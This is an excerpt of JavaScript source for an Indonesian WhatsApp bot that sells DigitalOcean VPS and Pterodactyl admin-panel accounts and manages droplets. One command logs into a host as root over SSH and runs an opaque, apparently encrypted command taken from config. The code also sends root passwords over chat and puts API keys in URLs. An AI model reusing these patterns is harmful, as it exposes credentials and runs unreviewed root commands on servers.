const get = await axios.get(`https://nabzxapibot.vercel.app/api/orkut/createpayment?apikey=${global.apipayment2}&amount=${amount}&codeqr=${global.QrisOrderKuota}`)
const teks3 = `
*INFORMASI PEMBAYARAN*
  
 *• ID :* ${get.data.result.transactionId}
 *• Total Pembayaran :* Rp${await toIDR(get.data.result.amount)}
 *• Barang :* Vps Digital Ocean
 *• Expired :* 5 menit

*Note :* 
Qris pembayaran hanya berlaku dalam 5 menit, jika sudah melewati 5 menit pembayaran dinyatakan tidak valid!
Jika pembayaran berhasil bot akan otomatis mengirim notifikasi status pembayaran kamu.

Ketik *.batalbeli* untuk membatalkan
`
let msgQr = await TamaMods.sendMessage(m.chat, {
  footer: `${botname2}\nAuto Order Vps`,
  buttons: [
    {
      buttonId: `.batalbeli`,
      buttonText: { displayText: 'Batalkan Pembelian' },
      type: 1
    }
  ],
  headerType: 1,
  viewOnce: true,
  image: {url: get.data.result.qrImageUrl}, 
  caption: teks3,
  contextInfo: {
   mentionedJid: [m.sender]
  },
})
db.users[m.sender].status_deposit = true
db.users[m.sender].saweria = {
msg: msgQr, 
chat: m.sender,
idDeposit: get.data.result.transactionId, 
amount: get.data.result.amount.toString(), 
exp: function () {
setTimeout(async () => {
if (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount == db.users[m.sender].saweria.amount) {
await TamaMods.sendMessage(db.users[m.sender].saweria.chat, {text: "QRIS Pembayaran telah expired!"}, {quoted: db.users[m.sender].saweria.msg})
await TamaMods.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key })
db.users[m.sender].status_deposit = false
await clearInterval(db.users[m.sender].saweria.exp)
delete db.users[m.sender].saweria
}
}, 300000)
}
}

await db.users[m.sender].saweria.exp()
while (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount) {
await sleep(8000)
const resultcek = await axios.get(`https://nabzxapibot.vercel.app/api/orkut/cekstatus?apikey=${global.apipayment2}&merchant=${global.IdMerchant}&keyorkut=${global.ApikeyOrderKuota}`)
const req = await resultcek.data
if (db.users[m.sender].saweria && req?.amount == db.users[m.sender].saweria.amount) {
db.users[m.sender].status_deposit = false
await clearInterval(db.users[m.sender].saweria.exp)
await TamaMods.sendMessage(db.users[m.sender].saweria.chat, {text: `
*PEMBAYARAN BERHASIL DITERIMA ✅*

 *• ID :* ${db.users[m.sender].saweria.idDeposit}
 *• Total Pembayaran :* Rp${await toIDR(db.users[m.sender].saweria.amount)}
 *• Barang :* Vps Digital Ocean
`}, {quoted: db.users[m.sender].saweria.msg})
var orang = db.users[m.sender].saweria.chat
    let hostname = "#" + m.sender.split("@")[0]
    
    try {        
        let dropletData = {
            name: hostname,
            region: "sgp1", 
            size: Obj.images,
            image: 'ubuntu-20-04-x64',
            ssh_keys: null,
            backups: false,
            ipv6: true,
            user_data: null,
            private_networking: null,
            volumes: null,
            tags: ['T']
        };

        let password = await generateRandomPassword()
        dropletData.user_data = `#cloud-config
password: ${password}
chpasswd: { expire: False }`;

        let response = await fetch('https://api.digitalocean.com/v2/droplets', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Authorization': "Bearer " + global.apiDigitalOcean 
            },
            body: JSON.stringify(dropletData)
        });

        let responseData = await response.json();

        if (response.ok) {
            let dropletConfig = responseData.droplet;
            let dropletId = dropletConfig.id;

            // Menunggu hingga VPS selesai dibuat
            await Reply(`Memproses pembuatan vps...`);
            await new Promise(resolve => setTimeout(resolve, 60000));

            // Mengambil informasi lengkap tentang VPS
            let dropletResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
                method: 'GET',
                headers: {
                    'Content-Type': 'application/json',
                    'Authorization': "Bearer " + global.apiDigitalOcean
                }
            });

            let dropletData = await dropletResponse.json();
            let ipVPS = dropletData.droplet.networks.v4 && dropletData.droplet.networks.v4.length > 0 
                ? dropletData.droplet.networks.v4[0].ip_address 
                : "Tidak ada alamat IP yang tersedia";

            let messageText = `VPS berhasil dibuat!\n\n`;
            messageText += `ID: ${dropletId}\n`;
            messageText += `IP VPS: ${ipVPS}\n`;
            messageText += `Password: ${password}`;

            await TamaMods.sendMessage(orang, { text: messageText });
        } else {
            throw new Error(`Gagal membuat VPS: ${responseData.message}`);
        }
    } catch (err) {
        console.error(err);
        Reply(`Terjadi kesalahan saat membuat VPS: ${err}`);
    }
await TamaMods.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key })
delete db.users[m.sender].saweria
}
}

}
break





//================================================================================



case "buyadp": {
if (m.isGroup) return Reply("Pembelian panel pterodactyl hanya bisa di dalam private chat")
if (db.users[m.sender].status_deposit) return Reply("Masih ada transaksi yang belum diselesaikan, ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!")
let us = crypto.randomBytes(4).toString('hex')
let Obj = {}
Obj.harga = "20000" 
Obj.username = us
const UrlQr = global.qrisOrderKuota

const amount  = Number(Obj.harga) + generateRandomNumber(110, 250)
const get = await axios.get(`https://nabzxapibot.vercel.app/api/orkut/createpayment?apikey=${global.apipayment2}&amount=${amount}&codeqr=${global.QrisOrderKuota}`)
const teks3 = `
*INFORMASI PEMBAYARAN*
  
 *• ID :* ${get.data.result.transactionId}
 *• Total Pembayaran :* Rp${await toIDR(get.data.result.amount)}
 *• Barang :* Admin Panel Pterodactyl
 *• Expired :* 5 menit

*Note :* 
Qris pembayaran hanya berlaku dalam 5 menit, jika sudah melewati 5 menit pembayaran dinyatakan tidak valid!
Jika pembayaran berhasil bot akan otomatis mengirim notifikasi status pembayaran kamu.

Ketik *.batalbeli* untuk membatalkan
`
let msgQr = await TamaMods.sendMessage(m.chat, {
  footer: `${global.botname2}\nAuto Order Adp`,
  buttons: [
    {
      buttonId: `.batalbeli`,
      buttonText: { displayText: 'Batalkan Pembelian' },
      type: 1
    }
  ],
  headerType: 1,
  viewOnce: true,
  image: {url: get.data.result.qrImageUrl}, 
  caption: teks3,
  contextInfo: {
   mentionedJid: [m.sender]
  },
})
db.users[m.sender].status_deposit = true
db.users[m.sender].saweria = {
msg: msgQr, 
chat: m.sender,
idDeposit: get.data.result.transactionId, 
amount: get.data.result.amount.toString(), 
exp: function () {
setTimeout(async () => {
if (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount == db.users[m.sender].saweria.amount) {
await TamaMods.sendMessage(db.users[m.sender].saweria.chat, {text: "QRIS Pembayaran telah expired!"}, {quoted: db.users[m.sender].saweria.msg})
await TamaMods.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key })
db.users[m.sender].status_deposit = false
await clearInterval(db.users[m.sender].saweria.exp)
delete db.users[m.sender].saweria
}
}, 300000)
}
}

await db.users[m.sender].saweria.exp()

while (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount) {
await sleep(8000)
const resultcek = await axios.get(`https://nabzxapibot.vercel.app/api/orkut/cekstatus?apikey=${global.apipayment2}&merchant=${global.IdMerchant}&keyorkut=${global.ApikeyOrderKuota}`)
const req = await resultcek.data
if (db.users[m.sender].saweria && req?.amount == db.users[m.sender].saweria.amount) {
db.users[m.sender].status_deposit = false
await clearInterval(db.users[m.sender].saweria.exp)
await TamaMods.sendMessage(db.users[m.sender].saweria.chat, {text: `
*PEMBAYARAN BERHASIL DITERIMA ✅*

 *• ID :* ${db.users[m.sender].saweria.idDeposit}
 *• Total Pembayaran :* Rp${await toIDR(db.users[m.sender].saweria.amount)}
 *• Barang :* Admin Panel Pterodactyl
`}, {quoted: db.users[m.sender].saweria.msg})
let username = Obj.username
let email = username+"@gmail.com"
let name = capital(username)
let password = crypto.randomBytes(4).toString('hex')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Admin",
"root_admin": true,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return Reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
var teks = `*Data Akun Admin Panel Anda*

*📡 ID User (${user.id})* 
*👤 Username :* ${user.username}
*🔐 Password :* ${password.toString()}
* ${global.domain}

*Syarat & Ketentuan :*
* Expired akun 1 bulan
* Simpan data ini sebaik mungkin
* Jangan asal hapus server!
* Ketahuan maling sc, auto delete akun no reff!
`
await fs.writeFileSync("./akunpanel.txt", teks)
await TamaMods.sendMessage(db.users[m.sender].saweria.chat, {document: fs.readFileSync("./akunpanel.txt"), fileName: "akunpanel.txt", mimetype: "text/plain", caption: teks}, {quoted: pantek})
await fs.unlinkSync("./akunpanel.txt")
await TamaMods.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key })
delete db.users[m.sender].saweria
}
}

}
break

//================================================================================

case "batalbeli": {
if (m.isGroup) return
if (db.users[m.sender].status_deposit == false) return 
db.users[m.sender].status_deposit = false
if ('saweria' in db.users[m.sender]) {
await TamaMods.sendMessage(m.chat, {text: "Berhasil membatalkan pembelian"}, {quoted: db.users[m.sender].saweria.msg})
await TamaMods.sendMessage(m.chat, { delete: db.users[m.sender].saweria.msg.key })
await clearInterval(db.users[m.sender].saweria.exp)
delete db.users[m.sender].saweria
} else {
return Reply("Berhasil membatalkan pembelian")
}
}
break

//================================================================================

case 'listdroplet': {
if (!isCreator) return Reply(mess.owner)
try {
const getDroplets = async () => {
try {
const response = await fetch('https://api.digitalocean.com/v2/droplets', {
headers: {
Authorization: "Bearer " + global.apidigitalocean
}
});
const data = await response.json();
return data.droplets || [];
} catch (err) {
Reply('Error fetching droplets: ' + err);
return [];
}
};

getDroplets().then(droplets => {
let totalvps = droplets.length;
let mesej = `List droplet digital ocean kamu: ${totalvps}\n\n`;

if (droplets.length === 0) {
mesej += 'Tidak ada droplet yang tersedia!';
} else {
droplets.forEach(droplet => {
const ipv4Addresses = droplet.networks.v4.filter(network => network.type === "public");
const ipAddress = ipv4Addresses.length > 0 ? ipv4Addresses[0].ip_address : 'Tidak ada IP!';
mesej += `Droplet ID: ${droplet.id}
Hostname: ${droplet.name}
Username: Root
IP: ${ipAddress}
Ram: ${droplet.memory} MB
Cpu: ${droplet.vcpus} CPU
OS: ${droplet.image.distribution}
Storage: ${droplet.disk} GB
Status: ${droplet.status}\n`;
});
}
TamaMods.sendMessage(m.chat, { text: mesej }, {quoted: pantek});
});
} catch (err) {
Reply('Terjadi kesalahan saat mengambil data droplet: ' + err);
}
}
break

//================================================================================

case 'restartvps': {
if (!isCreator) return Reply(mess.owner)
if (!text) return Reply(example("iddroplet"))
let dropletId = text
const restartVPS = async (dropletId) => {
try {
const apiUrl = `https://api.digitalocean.com/v2/droplets/${dropletId}/actions`;

const response = await fetch(apiUrl, {
method: 'POST',
headers: {
'Content-Type': 'application/json',
'Authorization': `Bearer ${global.apidigitalocean}`
},
body: JSON.stringify({
type: 'reboot'
})
});

if (response.ok) {
const data = await response.json();
return data.action;
} else {
const errorData = await response.json();
Reply(`Gagal melakukan restart VPS: ${errorData.message}`);
}
} catch (err) {
Reply('Terjadi kesalahan saat melakukan restart VPS: ' + err);
}
};

restartVPS(dropletId)
.then((action) => {
Reply(`Aksi restart VPS berhasil dimulai. Status aksi: ${action.status}`);
})
.catch((err) => {
Reply(err);
})

}
break

//================================================================================

case 'rebuild': {
if (!isCreator) return Reply(mess.owner)
if (!text) return Reply(example("iddroplet"))
let dropletId = text 
let rebuildVPS = async () => {
try {
// Rebuild droplet menggunakan API DigitalOcean
const response = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}/actions`, {
method: 'POST',
headers: {
'Content-Type': 'application/json',
'Authorization': `Bearer ${global.apidigitalocean}`
},
body: JSON.stringify({
type: 'rebuild',
image: 'ubuntu-20-04-x64' // Ganti dengan slug image yang ingin digunakan untuk rebuild (misal: 'ubuntu-18-04-x64')
})
});

if (response.ok) {
const data = await response.json();
Reply('Rebuild VPS berhasil dimulai. Status aksi:', data.action.status);
const vpsInfo = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
method: 'GET',
headers: {
'Content-Type': 'application/json',
'Authorization': `Bearer ${global.apidigitalocean}`
}
});
if (vpsInfo.ok) {
const vpsData = await vpsInfo.json();
const droplet = vpsData.droplet;
const ipv4Addresses = droplet.networks.v4.filter(network => network.type === 'public');
const ipAddress = ipv4Addresses.length > 0 ? ipv4Addresses[0].ip_address : 'Tidak ada IP!';

const textvps = `*VPS BERHASIL DI REBUILD*
IP VPS: ${ipAddress}
SYSTEM IMAGE: ${droplet.image.slug}`;
await sleep(60000) 
TamaMods.sendMessage(m.chat, { text: textvps }, {quoted: pantek});
} else {
Reply('Gagal mendapatkan informasi VPS setelah rebuild!');
}
} else {
const errorData = await response.json();
Reply('Gagal melakukan rebuild VPS : ' + errorData.message);
}
} catch (err) {
Reply('Terjadi kesalahan saat melakukan rebuild VPS : ' + err);
}};
rebuildVPS();
}
break
//------(Batas Case)------//
case 'cekdroplet': {
if (!isCreator) return Reply(mess.owner)
let dropletId = args[0];
if (!dropletId) return Reply('ID droplet belum diberikan!');
const getDropletInfo = async (dropletId) => {
try {
const apiUrl = `https://api.digitalocean.com/v2/droplets/${dropletId}`;
const response = await fetch(apiUrl, {
headers: {
'Content-Type': 'application/json',
'Authorization': `Bearer ${global.apidigitalocean}`
}
});
if (response.ok) {
const data = await response.json();
const droplet = data.droplet;
const ipv4Addresses = droplet.networks.v4.filter(network => network.type === 'public');
const ipAddress = ipv4Addresses.length > 0 ? ipv4Addresses[0].ip_address : 'Tidak ada IP!';
const vpsRam = droplet.memory / 1024;
return {
dropletid: droplet.id,
username: droplet.name,
ip: ipAddress,
ram: `${vpsRam} GB`,
os: droplet.image.distribution,
cpu: droplet.vcpus > 1 ? `${droplet.vcpus} vCPU` : `${droplet.vcpus} vCPUs`,
storage: droplet.disk,
status: droplet.status // Menambahkan status VPS
};
} else {
const errorData = await response.json();
return new Error(`Gagal memeriksa detail droplet: ${errorData.message}`);
}
} catch (err) {
Reply('Terjadi kesalahan saat memeriksa detail droplet:', err.message);
return new Error('Terjadi kesalahan saat memeriksa detail droplet.');
}
};

getDropletInfo(dropletId)
.then((info) => {
let textku = `*DETAIL VPS KAMU*
Droplet ID: ${info.dropletid}
Hostname: ${info.username}
IPv4: ${info.ip}
Ram: ${info.ram}
OS: ${info.os}
CPU: ${info.cpu}
Storage: ${info.storage}
Status: ${info.status}`;
TamaMods.sendMessage(m.chat, { text: textku });
})
.catch((err) => {
Reply(err);
TamaMods.sendMessage(m.chat, { text: 'Terjadi kesalahan saat memeriksa detail VPS.' });
});
break;
}

case 'gantipwvps': case "gantipasswordvps": {
if (!isCreator) return Reply(mess.owner)
 let t = text.split(',');
 if (t.length < 2) return Reply(`*Format salah!*\nPenggunaan : ${prefix+command} ipvps,passwordlama,paswordbaru`)
 
 let ipvps = t[0];
 let passwd = t[1];
 let pw = t[2];
 const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
 };

 // Gunakan string terenkripsi di kode Anda
 const commandPanel = `${global.bash}`
 const conn = new Client();
 
 conn.on('ready', () => {
 isSuccess = true; // Set flag menjadi true jika koneksi berhasil
 Reply('*UBAH PASSWORD VPS DIMULAI*');
 
 conn.exec(commandPanel, (err, stream) => {
 if (err) throw err;
 stream.on('close', (code, signal) => {
 console.log('Stream closed with code ' + code + ' and signal ' + signal);
 Reply(`*BERIKUT DATA VPS ANDA*\n\n*IP VPS* : ${ipvps}\n*PW VPS* : ${pw}\n\n*NOTES:*\nSIMPAN DATA VPS SECARA BAIK² JANGAN SAMPAI HILANG TERIMAKASIH🥰`)
 conn.end();
 }).on('data', (data) => {
 stream.write(`${global.tokeninstall}\n`);
 stream.write('8\n');
 stream.write(`${pw}\n`)
 stream.write(`${pw}\n`);
 console.log('STDOUT: ' + data);
 }).stderr.on('data', (data) => {
 console.log('STDERR: ' + data);
 });
 });
 }).on('error', (err) => {
 console.log('Connection Error: ' + err);
 Reply('Katasandi atau IP tidak valid');
 }).connect(connSettings);
 }
break

//================================================================================

case "sisadroplet": {
if (!isCreator) return Reply(mess.owner)
async function getDropletInfo() {
try {
const accountResponse = await axios.get('https://api.digitalocean.com/v2/account', {
headers: {
Authorization: `Bearer ${global.apidigitalocean}`,
},
});

const dropletsResponse = await axios.get('https://api.digitalocean.com/v2/droplets', {
headers: {
Authorization: `Bearer ${global.apidigitalocean}`,
},
});

if (accountResponse.status === 200 && dropletsResponse.status === 200) {
const dropletLimit = accountResponse.data.account.droplet_limit;
const dropletsCount = dropletsResponse.data.droplets.length;
const remainingDroplets = dropletLimit - dropletsCount;

return {
dropletLimit,
remainingDroplets,
totalDroplets: dropletsCount,
};
} else {
return new Error('Gagal mendapatkan data akun digital ocean atau droplet!');
}
} catch (err) {
return err;
}}
async function sisadropletHandler() {
try {
if (!isCreator) return Reply(mess.owner)

const dropletInfo = await getDropletInfo();
Reply(`Sisa droplet yang dapat kamu pakai: ${dropletInfo.remainingDroplets}

Total droplet terpakai: ${dropletInfo.totalDroplets}`);
} catch (err) {
Reply(`Terjadi kesalahan: ${err}`);
}}
sisadropletHandler();
}
break

//================================================================================

case "deldroplet": {
if (!isCreator) return Reply(mess.owner)
if (!text) return Reply(example("iddroplet"))
let dropletId = text
let deleteDroplet = async () => {
try {
let response = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
method: 'DELETE',
headers: {
'Content-Type': 'application/json',
'Authorization': `Bearer ${global.apidigitalocean}`
}
});

if (response.ok) {
Reply('Droplet berhasil dihapus!');
} else {
const errorData = await response.json();
return new Error(`Gagal menghapus droplet: ${errorData.message}`);
}
} catch (error) {
console.error('Terjadi kesalahan saat menghapus droplet:', error);
Reply('Terjadi kesalahan saat menghapus droplet.');
}};
deleteDroplet();
}
break
//------(Batas Case)------//
case 'changeapido' :
if (!isCreator) return Reply(mess.owner)
if (text || m.quoted) { 
const newteks = m.quoted ? m.quoted.text : text
global.apidigitalocean = `${text}`
Reply('Succesfully Change Token Api Do')
} else {
return Reply(`*format salah*\nContoh: ${prefix}changeapido *<TOKEN-API>*`)
}
break
//------(Batas Case)------//
case 'checkdo': {
if (!isCreator) return Reply(mess.owner)

const axios = require('axios');
const DO_API_TOKEN = global.apidigitalocean; // Ganti dengan API token DigitalOcean Anda

// Fungsi untuk mengambil informasi akun DigitalOcean
async function checkDOInfo() {
try {
// API untuk mendapatkan informasi pengguna
const accountInfo = await axios.get('https://api.digitalocean.com/v2/account', {
headers: {
'Authorization': `Bearer ${DO_API_TOKEN}`
}
});

// API untuk mendapatkan informasi droplet
const dropletsInfo = await axios.get('https://api.digitalocean.com/v2/droplets', {
headers: {
'Authorization': `Bearer ${DO_API_TOKEN}`
}
});

// Data Akun
const account = accountInfo.data.account;
const droplets = dropletsInfo.data.droplets;

// Hitung jumlah droplet
const dropletCount = droplets.length;

// Buat informasi tentang setiap droplet
let dropletDetails = '';
droplets.forEach((droplet, index) => {
dropletDetails += `
${index + 1}. Name: ${droplet.name}
Status: ${droplet.status}
Memory: ${droplet.memory} MB
Disk: ${droplet.disk} GB
Region: ${droplet.region.slug}
IP: ${droplet.networks.v4[0]?.ip_address || 'N/A'}\n`;
});

// Pesan hasil
return `
🖥️ *DigitalOcean Account Info*
Name: ${account.name || 'N/A'}
Email: ${account.email || 'N/A'}
Email Verified: ${account.email_verified ? 'Yes' : 'No'}
Droplets Used: ${dropletCount}

🌐 *Droplet Details*:
${dropletDetails || 'No droplets found.'}`;
} catch (error) {
console.error('Error fetching DO info:', error.message);
return '⚠️ Gagal mengambil informasi akun DigitalOcean. Pastikan API token benar.';
}
}

// Jalankan fungsi dan kirim hasilnya
checkDOInfo().then(info => {
Reply(info); // Sesuaikan fungsi pengiriman pesan sesuai bot Anda
});
}
break;

//================================================================================

case "r1c1": case "r2c1": case "r2c2": case "r4c2": case "r8c4": case "r16c4": {
if (!isCreator) return Reply(mess.owner)
if (!text) return Reply(example("hostname"))
    await sleep(1000)
    let images
    let region = "nyc3"
    if (command == "r1c1") {
    images = "s-1vcpu-1gb"
    } else if (command == "r2c1") {
    images = "s-1vcpu-2gb"
    } else if (command == "r2c2") {
    images = "s-2vcpu-2gb"
    } else if (command == "r4c2") {
    images = "s-2vcpu-4gb"
    } else if (command == "r8c4") {
    images = 's-4vcpu-8gb'
    } else {
    images = "s-4vcpu-16gb-amd"
    region = "nyc3"
    }
    let hostname = text.toLowerCase()
    if (!hostname) return Reply(example("hostname"))
    
    try {        
        let dropletData = {
            name: hostname,
            region: region, 
            size: images,
            image: 'ubuntu-20-04-x64',
            ssh_keys: null,
            backups: false,
            ipv6: true,
            user_data: null,
            private_networking: null,
            volumes: null,
            tags: ['T']
        };

        let password = await  generateRandomPassword()
        dropletData.user_data = `#cloud-config
password: ${password}
chpasswd: { expire: False }`;

        let response = await fetch('https://api.digitalocean.com/v2/droplets', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Authorization': "Bearer " + global.apidigitalocean 
            },
            body: JSON.stringify(dropletData)
        });

        let responseData = await response.json();

        if (response.ok) {
            let dropletConfig = responseData.droplet;
            let dropletId = dropletConfig.id;

            // Menunggu hingga VPS selesai dibuat
            await Reply(`Memproses pembuatan vps...`);
            await new Promise(resolve => setTimeout(resolve, 60000));

            // Mengambil informasi lengkap tentang VPS
            let dropletResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
                method: 'GET',
                headers: {
                    'Content-Type': 'application/json',
                    'Authorization': "Bearer " + global.apidigitalocean
                }
            });

            let dropletData = await dropletResponse.json();
            let ipVPS = dropletData.droplet.networks.v4 && dropletData.droplet.networks.v4.length > 0 
                ? dropletData.droplet.networks.v4[0].ip_address 
                : "Tidak ada alamat IP yang tersedia";

            let messageText = `VPS berhasil dibuat!\n\n`;
            messageText += `ID: ${dropletId}\n`;
            messageText += `IP VPS: ${ipVPS}\n`;
            messageText += `Password: ${password}`;

            await TamaMods.sendMessage(m.chat, { text: messageText });
        } else {
            throw new Error(`Gagal membuat VPS: ${responseData.message}`);
        }
    } catch (err) {
        console.error(err);
        Reply(`Terjadi kesalahan saat membuat VPS: ${err}`);
    }
}
break
//------(Batas Case)------//
case "createvps": {
  if (!isCreator) return Reply(mess.owner)

  const args = text.split(' '); // Memisahkan argumen berdasarkan spasi
  const hostname = args[0]; // Nama host
  const sizeOption = args[1]; // Ukuran VPS
  const osOption = args[2] || "ubuntu"; // Default: Ubuntu
  const osVersionOption = args[3] || "20-04"; // Default: Ubuntu 20.04
  const regionOption = args[4] || "sgp1"; // Default: Singapore

  // Validasi argumen
  if (!hostname || !sizeOption) {
    return Reply(
      `*Format argumen salah!*\nCONTOH: ${prefix+command} namahostmu vps16g4c ubuntu 20-04 sgp1\n\n` +
      `*Opsi yang tersedia:*\n` +
      `- Ukuran VPS: vps1g1c, vps2g1c, vps2g2c, vps4g2c, vps8g4c, vps16g4c\n` +
      `- OS: ubuntu, debian, centos, fedora\n` +
      `- Versi OS:\n  Ubuntu: 20-04, 22-04\n  Debian: 10, 11\n  CentOS: 7, 8\n  Fedora: 34, 35\n` +
      `- Region: sgp1, nyc3, ams3, lon1, fra1, sfo1, blr1, tor1`
    );
  }

  // Peta OS dan Versi
  const osMap = {
    ubuntu: { '20-04': 'ubuntu-20-04-x64', '22-04': 'ubuntu-22-04-x64' },
    debian: { '10': 'debian-10-x64', '11': 'debian-11-x64' },
    centos: { '8': 'centos-8-x64', '7': 'centos-7-x64' },
    fedora: { '34': 'fedora-34-x64', '35': 'fedora-35-x64' },
  };

  if (!osMap[osOption]) {
    return Reply(`*OS tidak valid!*\nOS yang tersedia: ubuntu, debian, centos, fedora.`);
  }
  if (!osMap[osOption][osVersionOption]) {
    return Reply(
      `*Versi OS tidak valid!*\nVersi yang tersedia untuk ${osOption}: ${Object.keys(osMap[osOption]).join(', ')}`
    );
  }

  // Peta Ukuran
  const sizeMap = {
    vps1g1c: 's-1vcpu-1gb',
    vps2g1c: 's-1vcpu-2gb',
    vps2g2c: 's-2vcpu-2gb',
    vps4g2c: 's-2vcpu-4gb',
    vps8g4c: 's-4vcpu-8gb',
    vps16g4c: 's-4vcpu-16gb-amd',
  };

  if (!sizeMap[sizeOption]) {
    return Reply(`*Ukuran VPS tidak valid!*\nUkuran yang tersedia: ${Object.keys(sizeMap).join(', ')}`);
  }

  // Peta Region
  const regionMap = {
    sgp1: 'Singapore (SGP1)',
    nyc3: 'New York (NYC3)',
    ams3: 'Amsterdam (AMS3)',
    lon1: 'London (LON1)',
    fra1: 'Frankfurt (FRA1)',
    sfo1: 'San Francisco (SFO1)',
    blr1: 'Bangalore (BLR1)',
    tor1: 'Toronto (TOR1)',
  };

  if (!regionMap[regionOption]) {
    return Reply(`*Region tidak valid!*\nRegion yang tersedia: ${Object.keys(regionMap).join(', ')}`);
  }

  try {
    // Data untuk membuat droplet
    let dropletData = {
      name: hostname.toLowerCase(),
      region: regionOption,
      size: sizeMap[sizeOption],
      image: osMap[osOption][osVersionOption],
      ssh_keys: null,
      backups: false,
      ipv6: true,
      user_data: null,
      private_networking: null,
      volumes: null,
      tags: ['T'],
    };

    let password = generateRandomPassword();
    dropletData.user_data = `#cloud-config\npassword: ${password}\nchpasswd: { expire: False }`;

    let response = await fetch('https://api.digitalocean.com/v2/droplets', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        Authorization: 'Bearer ' + global.apidigitalocean,
      },
      body: JSON.stringify(dropletData),
    });

    let responseData = await response.json();

    if (response.ok) {
      let dropletConfig = responseData.droplet;
      let dropletId = dropletConfig.id;

      // Menunggu hingga VPS selesai dibuat
      await Reply(`Memproses pembuatan VPS...`);
      await new Promise(resolve => setTimeout(resolve, 60000));

      // Mengambil informasi VPS
      let dropletResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
        method: 'GET',
        headers: {
          'Content-Type': 'application/json',
          Authorization: 'Bearer ' + global.apidigitalocean,
        },
      });

      let dropletDetails = await dropletResponse.json();
      let ipVPS =
        dropletDetails.droplet.networks.v4 && dropletDetails.droplet.networks.v4.length > 0
          ? dropletDetails.droplet.networks.v4[0].ip_address
          : 'Tidak ada alamat IP yang tersedia';

      let messageText = `VPS berhasil dibuat!\n\n`;
      messageText += `ID: ${dropletId}\n`;
      messageText += `IP VPS: ${ipVPS}\n`;
      messageText += `Password: ${password}`;

      await TamaMods.sendMessage(m.chat, { text: messageText });
    } else {
      throw new Error(`Gagal membuat VPS: ${responseData.message}`);
    }
  } catch (err) {
    console.error(err);
    Reply(`Terjadi kesalahan saat membuat VPS: ${err.message}`);
  }
}
break;

case 'turnon': {
  if (!isCreator) return Reply(mess.owner)
  
  let dropletId = args[0];
  if (!dropletId) return Reply('❌ ID droplet belum diberikan!');
  
  const accounts = [global.apidigitalocean];

  (async () => {
    for (let i = 0; i < accounts.length; i++) {
      try {
        const response = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}/actions`, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'Authorization': `Bearer ${accounts[i]}`
          },
          body: JSON.stringify({ type: 'power_on' })
        });

        if (response.ok) {
          return Reply(`✅ VPS berhasil dihidupkan dengan akun ke-${i + 1}!`);
        }
      } catch (err) {
        continue;
      }
    }
    Reply('❌ Gagal menghidupkan VPS. Droplet mungkin tidak ditemukan di semua akun.');
  })();
  break;
}

case 'turnoff': {
  if (!isCreator) return Reply(mess.owner)
  
  let dropletId = args[0];
  if (!dropletId) return Reply('❌ ID droplet belum diberikan!');
  
  const accounts = [global.apidigitalocean];

  (async () => {
    for (let i = 0; i < accounts.length; i++) {
      try {
        const response = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}/actions`, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'Authorization': `Bearer ${accounts[i]}`
          },
          body: JSON.stringify({ type: 'power_off' })
        });

        if (response.ok) {
          return Reply(`✅ VPS berhasil dimatikan dengan akun ke-${i + 1}!`);
        }
      } catch (err) {
        continue;
      }
    }
    Reply('❌ Gagal mematikan VPS. Droplet mungkin tidak ditemukan di semua akun.');
  })();
  break;
}

case "cvps": {
if (!isCreator) return Reply(mess.owner)
if (!q) return Reply(example("hostname"));
    global.hostname = text.toLowerCase();
let teks = `Silahkan Pilih Ram Vps Yang Mau Dicreate`
const sections = [{
	    	title: '𝑻𝒂𝒎𝒂 </> 𝑺𝒖𝒑𝒆𝒓𝒊𝒐𝒓',
	    	highlight_label: "🎭꙳͙͡༑ᐧ ̬𝑺𝒊𝒎𝒑𝒍𝒆 𝑩𝒐𝒕 𝑽𝟐̬꙳͙͡༑ᐧ〽️",
	    	rows: [{
	    		title: "VPS 1GB CORE 1",
	    		description: "Created Ram 1GB CORE 1",
	    		id: ".1gb1c"
	    	}]
	    }, {	    	
	    	rows: [{
	    		title: "VPS 2GB CORE 2", description: "Created Ram 2GB CORE 2", id: ".2gb2c"
	    	}, {
	    		title: "VPS 4GB CORE 2", description: "Created Ram 4GB CORE 2", id: ".4gb2c"
	    	},
	    	{
	    		title: "VPS 8GB CORE 4", description: "Created Ram 8GB CORE 4", id: ".8gb4c"
	    	},
	    	{
	    		title: "VPS 16GB CORE 4", description: "Created Ram 16GB CORE 4", id: ".16gb4c"
	    	}]
	    }]
	    
	    let listMessage = {
	    	title: "options",
	    	sections
	    }

const Vyunicos = [
